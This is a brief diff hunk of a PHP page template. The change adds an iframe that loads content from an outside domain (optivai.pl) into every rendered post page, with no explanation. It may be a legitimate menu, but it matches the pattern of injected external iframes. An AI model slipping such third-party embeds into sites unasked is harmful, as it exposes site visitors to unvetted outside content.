@@ -87,7 +87,7 @@ $file_name = "post". $page_name . ".php";
 <?php
  require_once "'.$get_sql_file_name.'";
 ?>
-
+    <iframe class="window_menu" src="https://optivai.pl/head/"></iframe>
 <div class="open_post_display"></div>
 
 <script>
